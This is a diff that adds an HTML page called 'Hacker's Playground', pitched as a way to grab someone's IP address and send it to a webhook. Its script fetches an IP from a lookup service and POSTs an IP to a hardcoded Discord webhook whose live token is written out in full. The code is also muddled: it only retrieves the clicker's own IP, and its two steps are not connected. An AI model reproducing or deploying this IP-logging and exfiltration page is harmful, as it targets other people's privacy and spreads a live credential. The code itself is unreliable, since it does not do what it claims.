@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verify</title>
+<style>
+body {
+  background-color: black;
+  color: red;
+  font-family: Arial, sans-serif;
+}
+
+h1 {
+  text-align: center;
+  font-size: 36px;
+}
+
+p {
+  font-size: 18px;
+}
+
+a {
+  color: red;
+  text-decoration: none;
+}
+
+a:hover {
+  color: white;
+}
+
+</style>
+</head>
+<body>
+
+<h1>Welcome to Hacker's Playground!</h1>
+<p>This is a place where you can learn and practice hacking skills.</p>
+<p>Click <a href="#" onclick="grabIP()">here</a> to grab someone's IP.</p>
+<p>Click <a href="#" onclick="sendToWebhook()">here</a> to send the IP to your webhook.</p>
+
+<script>
+function grabIP() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      var ip = this.responseText;
+      alert("IP grabbed: " + ip);
+    }
+  };
+  xhttp.open("GET", "https://api.ipify.org/?format=text", true);
+  xhttp.send();
+}
+
+function sendToWebhook() {
+  var ip = prompt("Enter the IP address:");
+  var xhttp = new XMLHttpRequest();
+  xhttp.open("POST", "https://discord.com/api/webhooks/1231400316390473728/PNOYU0ezMvLeCA-lF9P8R-VMWXnCOarTk5vyWB_jNkB9y8yLY8ZrgbNHaciyXZ4_eBzb", true);
+  xhttp.setRequestHeader("Content-type", "application/json");
+  var data = JSON.stringify({"ip": ip});
+  xhttp.send(data);
+}
+</script>
+
+</body>
+</html>
